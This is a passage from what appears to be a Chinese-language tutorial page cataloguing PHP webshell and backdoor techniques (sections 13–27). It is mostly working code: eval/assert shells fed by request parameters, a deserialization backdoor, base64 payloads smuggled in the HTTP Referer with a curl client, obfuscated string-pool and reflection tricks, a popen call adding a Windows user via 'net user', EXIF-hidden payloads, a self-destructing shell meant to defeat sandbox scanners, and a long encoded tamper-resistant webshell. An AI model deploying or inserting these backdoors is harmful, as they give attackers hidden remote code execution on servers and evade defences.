    ob_start(function ($c,$d)&#123;register_shutdown_function(&#39;assert&#39;,$c);&#125;); 
    echo $_REQUEST[&#39;pass&#39;]; 
    ob_end_flush(); 
?&gt;</code></pre>

<h3 id="13-利用assert-断言"><a href="#13-利用assert-断言" class="headerlink" title="13. 利用assert()断言"></a>13. 利用assert()断言</h3><pre class="language-none"><code class="language-none">&lt;?php
    $foobar &#x3D; &#39;system(&quot;dir&quot;)&#39;;
    assert($foobar);
?&gt;

1. 断言这个功能应该只被用来调试
2. 应该用于完整性检查时测试条件是否始终应该为 TRUE
3. 来指示某些程序错误
4. 或者检查具体功能的存在(类似扩展函数或特定的系统限制和功能)</code></pre>

<h3 id="14-数组映射类型函数处理后的回调机制"><a href="#14-数组映射类型函数处理后的回调机制" class="headerlink" title="14. 数组映射类型函数处理后的回调机制"></a>14. 数组映射类型函数处理后的回调机制</h3><p>array_map — 将回调函数作用到给定数组的单元上，可以利用array_map的这个特点，将第一个参数(回调函数)作为命令执行管道，第二个参数(callback参数)作为payload传入，从而构将传统的函数调用(payload)的模式转换为array_map(指令执行，payload)</p>
<pre class="language-none"><code class="language-none">&lt;?php 
    $new_array &#x3D; array_map(&quot;ass\x65rt&quot;, (array)$_REQUEST[&#39;op&#39;]);
?&gt;

&#x2F;&#x2F;http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php?op&#x3D;eval($_GET[1]): 菜刀密码: 1</code></pre>

<h3 id="15-PHP序列化-x2F-反序列化特性布置后门"><a href="#15-PHP序列化-x2F-反序列化特性布置后门" class="headerlink" title="15. PHP序列化&#x2F;反序列化特性布置后门"></a>15. PHP序列化&#x2F;反序列化特性布置后门</h3><pre class="language-none"><code class="language-none">&lt;?php
    class Example
    &#123;
       var $var &#x3D; &#39;&#39;;
       function __destruct()
       &#123;
          eval($this-&gt;var);
       &#125;
    &#125;
    &#x2F;&#x2F;$exp &#x3D;  new Example();
    &#x2F;&#x2F;$exp-&gt;var &#x3D; &quot;phpinfo();&quot;;
    &#x2F;&#x2F;die(serialize($exp));
    unserialize($_GET[&#39;saved_code&#39;]);
?&gt;

O:7:&quot;Example&quot;:1:&#123;s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;&#125;  
http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?saved_code&#x3D;O:7:&quot;Example&quot;:1:&#123;s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;&#125;  

&#x2F;&#x2F; 原理: 被序列化的对象在反序列化的时候会自动调用它的析构函数</code></pre>

<h3 id="16-使用HTTP头部字段进行指令传输"><a href="#16-使用HTTP头部字段进行指令传输" class="headerlink" title="16. 使用HTTP头部字段进行指令传输"></a>16. 使用HTTP头部字段进行指令传输</h3><pre class="language-none"><code class="language-none">通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果。

backdoor:
&lt;?php
    header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);
    &#x2F;&#x2F;将$_SERVER[&#39;HTTP_REFERER&#39;]中的参数解析到本地变量中，放到$a数组中
    parse_str($_SERVER[&#39;HTTP_REFERER&#39;], $a);
    &#x2F;&#x2F;判断数组变量$a中的第一个元素是否是&quot;10&quot;、并且数组元素个数是否是9个
    if(reset($a) &#x3D;&#x3D; &#39;10&#39; &amp;&amp; count($a) &#x3D;&#x3D; 9)
    &#123;    
        &#x2F;&#x2F;取出数组$a中索引6的元素，即我们传入的实际payload，并进行base64_decode解码
        eval(base64_decode(str_replace(&quot; &quot;, &quot;+&quot;, implode(array_slice($a, 6)))));
    &#125;
?&gt;

利用方式:
&lt;?php
    header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);
    &#x2F;&#x2F;要执行的代码
    $code &#x3D; &quot;phpinfo();&quot;;
    &#x2F;&#x2F;进行base64编码
    $code &#x3D; base64_encode($code);
    &#x2F;&#x2F;构造referer字符串
    $referer &#x3D; &quot;a&#x3D;10&amp;b&#x3D;ab&amp;c&#x3D;34&amp;d&#x3D;re&amp;e&#x3D;32&amp;f&#x3D;km&amp;g&#x3D;&#123;$code&#125;&amp;h&#x3D;&amp;i&#x3D;&quot;;
    &#x2F;&#x2F;后门url
    $url &#x3D; &#39;http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php&#39;;
    $ch &#x3D; curl_init();
    $options &#x3D; array(
        CURLOPT_URL &#x3D;&gt; $url,
        CURLOPT_HEADER &#x3D;&gt; FALSE,
        CURLOPT_RETURNTRANSFER &#x3D;&gt; TRUE,
        CURLOPT_REFERER &#x3D;&gt; $referer
    );
    curl_setopt_array($ch, $options);
    echo curl_exec($ch);
?&gt;

&#x2F;&#x2F; 这个webshell通过编码的referer来传递攻击载荷，HTTP通信的头部的任何字段、或者HTTP的数据部分的任何字段都可以当作webshell的payload来传递数据</code></pre>

<h3 id="17-乱序拼接法"><a href="#17-乱序拼接法" class="headerlink" title="17. 乱序拼接法"></a>17. 乱序拼接法</h3><pre class="language-none"><code class="language-none">&lt;?php  
    @$_&#x3D;&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;;  
    @$_&#x3D;&quot;a&quot;.$_.&quot;t&quot;;  
    @$_($&#123;&quot;_P&quot;.&quot;OS&quot;.&quot;T&quot;&#125;[1-2-5]);
?&gt;  

&#x2F;&#x2F; 这里双层$&#123;&#125;的作用，里面那个$&#123;&#125;是为了让_POST[-6]被解析出来的，如果不用这个花括号，则这个&quot;_POST[]&quot;就变成一个纯文本了，加上这个$&#123;&#125;之后，变量原本的变量特性就表现出来，也就能正确传参

&lt;?php
    $aaaaa&#x3D;&quot;sewtemznypianol&quot;;
    $char_system&#x3D;$aaaaa&#123;0&#125;.$aaaaa&#123;8&#125;.$aaaaa&#123;0&#125;.$aaaaa&#123;3&#125;.$aaaaa&#123;1&#125;.$aaaaa&#123;5&#125;;
    &#x2F;&#x2F;die($char_system);
    $aaaaaa&#x3D;&quot;edoced46esab_n&quot;;
    $char_base64_decode&#x3D;$aaaaaa&#123;11&#125;.$aaaaaa&#123;10&#125;.$aaaaaa&#123;9&#125;.$aaaaaa&#123;8&#125;.$aaaaaa&#123;7&#125;.$aaaaaa&#123;6&#125;.$aaaaaa&#123;12&#125;.$aaaaaa&#123;5&#125;.$aaaaaa&#123;4&#125;.$aaaaaa&#123;3&#125;.
　　　$aaaaaa&#123;2&#125;.$aaaaaa&#123;1&#125;.$aaaaaa&#123;0&#125;;
    die($char_base64_decode);
    echo $char_system($char_base64_decode(&quot;aXBjb25maWc&#x3D;&quot;));
?&gt;

这种webshell的编写思路很巧妙，和&quot;乱序插入&quot;不是一个做法

1) &quot;乱序插入&quot;是在一段正常的webshell代码中随机插入一些杂乱的无意义的字母，然后再在下面使用preg_replace之类的正则替换来去除掉这些&quot;混淆盐字母&quot;，以还原出原有的正常的webshell代码

2) 这种做法先定义一个&quot;字母池&quot;，这个&quot;字母池&quot;包含有我们需要构造的关键函数的字符。我们通过从这个字母池中选取特定的索引下的字母，以此来构造出我们想要的&quot;动态函数&quot;(system、base64_decode)</code></pre>

<h3 id="18-PHP管道技术利用"><a href="#18-PHP管道技术利用" class="headerlink" title="18. PHP管道技术利用"></a>18. PHP管道技术利用</h3><pre class="language-none"><code class="language-none">&lt;?php
    &#x2F;*
        PHP中如何增加一个系统用户
        下面是一段例程，
        用户名: test
        密码是: 123
    *&#x2F;
    $command &#x3D; &quot;net user&quot;;
    $useradd &#x3D; &quot;add &quot;;
    $pwd &#x3D; &quot;123&quot;;
    $user &#x3D; &quot;test&quot;;  
    $user_add &#x3D; sprintf(&quot;%s &quot;%s %s&quot;&quot;, $command, $useradd, $user, $pwd);
    $fp &#x3D; @popen($user_add,&quot;w&quot;);  
    @pclose($fp);
?&gt;

&#x2F;&#x2F; 命令执行成功，添加账户成功。PHP执行命令有很多方法，eval、passthru、system、assert、popen、exec、shell_exec</code></pre>

<h3 id="19-PHP指令替换"><a href="#19-PHP指令替换" class="headerlink" title="19. PHP指令替换"></a>19. PHP指令替换</h3><pre class="language-none"><code class="language-none">&lt;?php   
    $cmd &#x3D; &#96;dir&#96;;  
    echo $cmd;   
?&gt;  </code></pre>

<h3 id="20-基于图片文件非可显示字段部署PHP木马"><a href="#20-基于图片文件非可显示字段部署PHP木马" class="headerlink" title="20. 基于图片文件非可显示字段部署PHP木马"></a>20. 基于图片文件非可显示字段部署PHP木马</h3><pre class="language-none"><code class="language-none">Malware Hidden Inside JPG EXIF Headers: exif_read_data() 函数从 JPEG 或 TIFF 图像文件中读取 EXIF 头信息。这样就可以读取数码相机产生的元数据

&lt;?php
    echo &quot;img.jpg:&lt;br &#x2F;&gt;\n&quot;;
    $exif &#x3D; exif_read_data(&#39;img.jpg&#39;, &#39;IFD0&#39;);
    &#x2F;&#x2F;IFD0     所有 IFD0 的标记数据。在标准的图像文件中这包含了图像大小及其它。
    echo $exif&#x3D;&#x3D;&#x3D;false ? &quot;No header data found.&lt;br &#x2F;&gt;&quot; : &quot;Image contains headers&lt;br &#x2F;&gt;&quot;;
    echo &quot;&lt;br &#x2F;&gt;&quot;;

    &#x2F;&#x2F;FILE    FileName, FileSize, FileDateTime, SectionsFound
    $exif &#x3D; exif_read_data(&#39;img.jpg&#39;, &#39;FILE&#39;, true);
    echo &quot;img.jpg:&lt;br &#x2F;&gt;\n&quot;;
    foreach ($exif as $key &#x3D;&gt; $section)
    &#123;
        foreach ($section as $name &#x3D;&gt; $val)
        &#123;
            echo &quot;$key.$name: $val&lt;br &#x2F;&gt;\n&quot;;
        &#125;
        echo &quot;&lt;br &#x2F;&gt;&quot;;
    &#125;
?&gt;

隐藏webshell思路

1. 和传统的图片木马不一样，传统的图片木马就是简单的利用type命令把webshell代码接在一个正常的图片尾部，然后在另一个脚本中使用include包含进来，PHP解析解析引擎会忽略在PHP看来毫无意义的图片数据的乱码，而去执行在文件结尾的PHP代码

2. 而关于这种图片木马，可以有一种更加精确的利用方式，图片(也就是EXIT格式的文件)的每个区段都是有精确意义的，可以将我们的webshell准确地放置在这些指定的区域，然后使用exif_read_data去读取读取出来，再使用preg_replace的&quot;e&quot;开关去动态执行，或者使用动态函数去动态执行

3. 这个方法可以用来规避include那种类型的黑名单检测

将webshell代码放置在EXIT的头部区域中，这里挑选: IFD0-&gt;
1. ImageDescription: &#x2F;.*&#x2F;e
2. Subject: eval(\$_POST[1])

&lt;?php  
    &#x2F;&#x2F;FILE    FileName, FileSize, FileDateTime, SectionsFound
    $exif &#x3D; exif_read_data(&#39;img.jpg&#39;, &#39;FILE&#39;, true);
    var_dump($exif[&#39;IFD0&#39;][&#39;ImageDescription&#39;]);
    var_dump($exif[&#39;IFD0&#39;][&#39;Subject&#39;]);
    preg_replace($exif[&#39;IFD0&#39;][&#39;ImageDescription&#39;], $exif[&#39;IFD0&#39;][&#39;Subject&#39;],&#39;&#39;);
    &#x2F;&#x2F;die();
?&gt;</code></pre>

<h3 id="21-注释-反射机制"><a href="#21-注释-反射机制" class="headerlink" title="21. 注释+反射机制"></a>21. 注释+反射机制</h3><pre class="language-none"><code class="language-none">&#x2F;&#x2F; 将webshell放到了&#x2F;**&#x2F;注释中，然后利用类的反射机制获取到，进行动态函数的执行

&lt;?php  
    &#x2F;**   
    * eval($_POST[1]);
    *&#x2F;  
    class TestClass &#123; &#125;  
    $rc &#x3D; new ReflectionClass(&#39;TestClass&#39;);  
    &#x2F;&#x2F;获取当前文档的注释
    $comment &#x3D; $rc-&gt;getDocComment();
    &#x2F;&#x2F;die(var_dump($comment));

    $pos &#x3D; strpos($comment,&#39;eval&#39;);
    &#x2F;&#x2F;die(var_dump($pos));  

    $eval&#x3D;substr($comment,$pos,16);  
    &#x2F;&#x2F;die($eval);
    eval($eval);
?&gt;

&#x2F;&#x2F; 利用反射类机制，将原本的webshell代码进行加花、换行、大小写变形，进行代码执行

&lt;?php
    &#x2F;**
    * eva
    * l($_GE
    * T[&quot;c&quot;]);
    * asse
    * rt
    *&#x2F;
    class TestClass &#123; &#125;
    $rc &#x3D; new ReflectionClass(&#39;TestClass&#39;);
    $str &#x3D; $rc-&gt;getDocComment();
    die(var_dump($str));
    $evf&#x3D;substr($str,strpos($str,&#39;e&#39;),3);
    $evf&#x3D;$evf.substr($str,strpos($str,&#39;l&#39;),6);
    $evf&#x3D;$evf.substr($str,strpos($str,&#39;T&#39;),8);
    $fu&#x3D;substr($str,strpos($str,&#39;as&#39;),4);
    $fu&#x3D;$fu.substr($str,strpos($str,&#39;r&#39;),2);
    $fu($evf);
?&gt; </code></pre>

<h3 id="22-自毁性Webshell"><a href="#22-自毁性Webshell" class="headerlink" title="22. 自毁性Webshell"></a>22. 自毁性Webshell</h3><p>PHP的动态沙箱检测技术，对PHP执行引擎进行hook进行动态检测，即构造出一个沙箱，让目标脚本在里面执行一次，然后对执行的结果进行判断；而我们的沙箱在触发这个脚本执行的时候由于没有给定准确的参数”code”，就会导致毁灭性覆写”fwrite ($fp, $content)”的结果，这样，沙箱的执行结果就是一个普通的文本，这种方法利用沙箱的机制，沙箱导致了文件的毁坏</p>
<pre class="language-none"><code class="language-none">&lt;?php
    &#x2F;&#x2F;$url &#x3D; $_SERVER[&#39;PHP_SELF&#39;];
    &#x2F;&#x2F;$filename &#x3D; end(explode(&#39;&#x2F;&#39;,$url));
    &#x2F;&#x2F;die($filename);
    if($_REQUEST[&quot;code&quot;]&#x3D;&#x3D;pany)
    &#123;
        echo str_rot13(&#39;riny($_CBFG[pzq]);&#39;);
        eval(str_rot13(&#39;riny($_CBFG[pzq]);&#39;));
    &#125;
    else
    &#123;
        $url &#x3D; $_SERVER[&#39;PHP_SELF&#39;];
        $filename &#x3D; end(explode(&#39;&#x2F;&#39;,$url));
           
        $content &#x3D; &#39;helloworld&#39;;
        $fp &#x3D; fopen (&quot;$filename&quot;,&quot;w&quot;);
        if (fwrite ($fp, $content))
        &#123;
            fclose ($fp);
            die (&quot;error&quot;);
        &#125;
        else
        &#123;
            fclose ($fp);
            die (&quot;good&quot;);
        &#125;
        exit;
    &#125;
?&gt;</code></pre>

<h3 id="23-利用本地变量注册技术"><a href="#23-利用本地变量注册技术" class="headerlink" title="23. 利用本地变量注册技术"></a>23. 利用本地变量注册技术</h3><pre class="language-none"><code class="language-none">&#x2F;&#x2F; 利用extract函数将输入数据注册为本地变量，然后利用PHP的动态执行特性进行动态函数执行

&lt;?php
    @extract ($_REQUEST);
    @die($ctime($atime));
?&gt;

http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;index.php?ctime&#x3D;assert&amp;atime&#x3D;phpinfo()

HP中有三种姿势可能导致本地变量注册，进而利用PHP的动态函数执行技巧进行WEBSHELL的构造
1) extract
2) parse_str
3) foreach(..) &#123; $$key &#x3D; $value; &#125;</code></pre>

<h3 id="24-利用ReflectionFunction反射"><a href="#24-利用ReflectionFunction反射" class="headerlink" title="24. 利用ReflectionFunction反射"></a>24. 利用ReflectionFunction反射</h3><pre class="language-none"><code class="language-none">&lt;?php
    $func &#x3D; new ReflectionFunction(&quot;system&quot;);
    echo $func-&gt;invokeArgs(array(&quot;$_GET[c]&quot;));
?&gt;</code></pre>

<h3 id="25-利用PHP自定义函数"><a href="#25-利用PHP自定义函数" class="headerlink" title="25. 利用PHP自定义函数"></a>25. 利用PHP自定义函数</h3><pre class="language-none"><code class="language-none">&lt;?php
    if(key($_GET)&#x3D;&#x3D;&#39;dede&#39;)
        &#x2F;&#x2F;call_user_func($_GET[&#39;dede&#39;], &quot;@eval($_POST[bs]);&quot;);
        call_user_func($_GET[&#39;dede&#39;], base64_decode(&#39;QGV2YWwoJF9QT1NUW2JzXSk7&#39;));
?&gt;

&lt;?php 
    &#x2F;&#x2F;call_user_func($_GET[&#39;dede&#39;], &quot;@eval($_POST[bs]);&quot;);
    call_user_func($_GET[&#39;dede&#39;], base64_decode(&#39;QGV2YWwoJF9QT1NUW2JzXSk7&#39;)); 
?&gt;

http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php?dede&#x3D;assert</code></pre>

<h3 id="26-防篡改WEBSHELL"><a href="#26-防篡改WEBSHELL" class="headerlink" title="26. 防篡改WEBSHELL"></a>26. 防篡改WEBSHELL</h3><p>这种WEBSHELL遵循了严格的生成逻辑，并精确地在代码中加入了花指令，只有文件完好无损才能正常解密出原始文件并执行，一旦文件遭到了任何修改，则解密过程会失败，导致webshell无法执行</p>
<pre class="language-none"><code class="language-none">&lt;?php &#x2F;* Powered by www.qibosoft.com *&#x2F;$lll11l11l11l11l1&#x3D;__FILE__;eval(base64_decode(&#39;JGxsMTFsbGwxMWxsbGwxMWw9Zm9wZW4oJGxsbDExbDExbDExbDExbDEsJ3JiJyk7ZnJlYWQoJGxsMTFsbGwxMWxsbGwxMWwsMjE2MCk7JGxsMWxsbGwxMTExMTExMWw9ZXhwbG9kZSgiXHQiLGJhc2U2NF9kZWNvZGUoZnJlYWQoJGxsMTFsbGwxMWxsbGwxMWwsMjcyKSkpOw&#x3D;&#x3D;&#39;));$lll111111ll1l1ll&#x3D;$ll1llll11111111l[0];$l1ll11lllll1ll1l&#x3D;$lll111111ll1l1ll&#123;2&#125;.$lll111111ll1l1ll&#123;5&#125;.$lll111111ll1l1ll&#123;8&#125;.$lll111111ll1l1ll&#123;11&#125;.$lll111111ll1l1ll&#123;14&#125;.$lll111111ll1l1ll&#123;17&#125;.$lll111111ll1l1ll&#123;20&#125;.$lll111111ll1l1ll&#123;23&#125;.$lll111111ll1l1ll&#123;26&#125;.$lll111111ll1l1ll&#123;29&#125;.$lll111111ll1l1ll&#123;32&#125;.$lll111111ll1l1ll&#123;35&#125;.$lll111111ll1l1ll&#123;38&#125;;$l11llll111l1l11l&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[1]);$l1l11111ll1l1l1l&#x3D;$l1ll11lllll1ll1l($l11llll111l1l11l&#123;2&#125;.$l11llll111l1l11l&#123;5&#125;.$l11llll111l1l11l&#123;8&#125;.$l11llll111l1l11l&#123;11&#125;.$l11llll111l1l11l&#123;14&#125;.$l11llll111l1l11l&#123;17&#125;.$l11llll111l1l11l&#123;20&#125;.$l11llll111l1l11l&#123;23&#125;);$lll1ll11l11l1ll1&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[2]);$l111ll111lll1111&#x3D;$l1ll11lllll1ll1l($lll1ll11l11l1ll1&#123;2&#125;.$lll1ll11l11l1ll1&#123;5&#125;.$lll1ll11l11l1ll1&#123;8&#125;.$lll1ll11l11l1ll1&#123;11&#125;.$lll1ll11l11l1ll1&#123;14&#125;.$lll1ll11l11l1ll1&#123;17&#125;.$lll1ll11l11l1ll1&#123;20&#125;.$lll1ll11l11l1ll1&#123;23&#125;);$ll1lll1lll111111&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[3]);$ll11llllll1lllll&#x3D;$l1ll11lllll1ll1l($ll1lll1lll111111&#123;2&#125;.$ll1lll1lll111111&#123;5&#125;.$ll1lll1lll111111&#123;8&#125;.$ll1lll1lll111111&#123;11&#125;.$ll1lll1lll111111&#123;14&#125;.$ll1lll1lll111111&#123;17&#125;.$ll1lll1lll111111&#123;20&#125;.$ll1lll1lll111111&#123;23&#125;);$lll1ll11l1111l11&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[4]);$ll1111l11l11llll&#x3D;$l1ll11lllll1ll1l($lll1ll11l1111l11&#123;2&#125;.$lll1ll11l1111l11&#123;5&#125;.$lll1ll11l1111l11&#123;8&#125;.$lll1ll11l1111l11&#123;11&#125;.$lll1ll11l1111l11&#123;14&#125;.$lll1ll11l1111l11&#123;17&#125;.$lll1ll11l1111l11&#123;20&#125;.$lll1ll11l1111l11&#123;23&#125;);$llll11l1ll111l1l&#x3D;$l1ll11lllll1ll1l($ll1llll11111111l[5]);$llllll1l11llllll&#x3D;$l1ll11lllll1ll1l($llll11l1ll111l1l&#123;2&#125;.$llll11l1ll111l1l&#123;5&#125;.$llll11l1ll111l1l&#123;8&#125;.$llll11l1ll111l1l&#123;11&#125;.$llll11l1ll111l1l&#123;14&#125;.$llll11l1ll111l1l&#123;17&#125;.$llll11l1ll111l1l&#123;20&#125;.$llll11l1ll111l1l&#123;23&#125;);eval($l1ll11lllll1ll1l(&#39;JGxsMTFsbGxsbGwxbGxsbGwoJGxsMTFsbGwxMWxsbGwxMWwsMTcpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJGxsMTFsbGxsbGwxbGxsbGwoJGxsMTFsbGwxMWxsbGwxMWwsMjMyKSkpOw&#x3D;&#x3D;&#39;));return ;?&gt;dGFiMWVhYjlzY2RlYjg2dG00cXVfZWJkY2ZlanFjMnZvdHBkdndlCU5UWmFjM0p0ZVRnNWJXbDNZV0phYkhsWGNIazBkWE05CWVHNWFPV050WWpGa2NYTnNhbkZrWm1oSVkzaE5jbkU5CWRucGFNVEZ1YW1KS2NIUnNabUpaYm1wWFpIQlJkMjQ5CU9HSmpZV3N6YjJ0U2FXMTVjSE5rYkdWSWMyaEpaSFk5CVoydGFkR0Z0YzNZNVlubDNjbnBhTjNSWGNtczBNbXM54bSULjFL6pblYuIkpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;AhDBms0qm82LqpqMrHT1O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;tGLOYY5fUpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;JqjcRhp75i6Lf4MwjO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;yS0ttoM7R7SDkJpvuNKUO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01USXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;vMCvyQqBIgcoO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;agQLu9pzZf25xZjXjO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UVXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;WOmDsuNvUYJUFK3O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;hx7OShbiw40pgFI3OeYhO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs&#x3D;lErzbn3Vk5O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01USXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qazJLU2twT3c9PScpKTs&#x3D;U5zJkvgx0MBjZXZhbCgkbDFsbDExbGxsbGwxbGwxbCgnSkd4c01URnNiR3hzYkd3eGJHeHNiR3dvSkd4c01URnNiR3d4TVd4c2JHd3hNV3dzTVRncE8yVjJZV3dvSkd3eGJHd3hNV3hzYkd4c01XeHNNV3dvSkd4c01URnNiR3hzYkd3eGJHeHNiR3dvSkd4c01URnNiR3d4TVd4c2JHd3hNV3dzTVRNNE9Da3BLVHNrYkd4c2JHeHNNV3d4TVd4c2JHeHNiQ2drYkd3eE1XeHNiREV4Ykd4c2JERXhiQ2s3JykpOw&#x3D;&#x3D;Orb94oK1BBaoF8cySgaWYoJF9QT1NUWydteXB3ZCddKXsNCglyZXF1aXJlX29uY2UoZGlybmFtZShfX0ZJTEVfXykuIi8uLi8uLi9pbmMvcXEuYXBpLnBocCIpOw0KCUBldmFsKHFxbWQ1KCJVVjlBR3g0ZlhrRVFSQWdlR2tGRkV4aENXVkVMRmdsVlFrd0ZWZ3dkQVZnY1JFZ1dFUlFSVVFzYVFsbEZFUnRmZTU1Yjc0YWU4OSIsJ0RFJywkX1BPU1RbJ215cHdkJ10pKTsNCn0NCg0KaWYoJGpvYj09ImdldCImJiRBcG93ZXJbdXBncmFkZV9vbF0pDQp7DQoNCgloYWNrX2FkbWluX3RwbCgnZ2V0Jyk7DQp9DQplbHNlaWYoJGFjdGlvbj09ImdldCImJiRBcG93ZXJbdXBncmFkZV9vbF0pDQp7DQoJJGZpbGV1cmw9Imh0dHA6Ly9kb3duLnFpYm9zb2Z0LmNvbS91cGdyYWRlLnppcCI7DQoJaWYoJGNvZGU9ZmlsZV9nZXRfY29udGVudHMoJGZpbGV1cmwpKQ0KCXsNCgkJd3JpdGVfZmlsZShST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIiwkY29kZSk7DQoJfQ0KCWVsc2VpZigkY29kZT1maWxlKCRmaWxldXJsKSkNCgl7DQoJCXdyaXRlX2ZpbGUoUk9PVF9QQVRILiJjYWNoZS91cGdyYWRlLnppcCIsJGNvZGUpOw0KCX0NCgllbHNlaWYoY29weSgkZmlsZXVybCxST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIikpDQoJew0KCX0NCgllbHNlaWYoJGNvZGU9c29ja09wZW5VcmwoJGZpbGV1cmwpKQ0KCXsNCgkJd3JpdGVfZmlsZShST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIiwkY29kZSk7DQoJfQ0KDQoJcmVxdWlyZV9vbmNlKFJPT1RfUEFUSC4iaW5jL2NsYXNzLnoucGhwIik7DQoJJHogPSBuZXcgWmlwOw0KCW1ha2VwYXRoKFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCSR6LT5FeHRyYWN0KFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZS56aXAiLFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCXVubGluayhST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIik7DQoJZWNobyAiPE1FVEEgSFRUUC1FUVVJVj1SRUZSRVNIIENPTlRFTlQ9JzA7VVJMPSR3ZWJkYlt3d3dfdXJsXS9jYWNoZS91cGdyYWRlL2luZGV4LnBocCc+IjsNCglleGl0Ow0KfQ&#x3D;&#x3D;Oz1aqN6Bs2Twgiat5H0qQeo5bgm84V1tvONOA</code></pre>

<h3 id="27-利用session-set-save-handler-callback"><a href="#27-利用session-set-save-handler-callback" class="headerlink" title="27. 利用session_set_save_handler callback"></a>27. 利用session_set_save_handler callback</h3><pre class="language-none"><code class="language-none">&lt;?php
    error_reporting(0); 
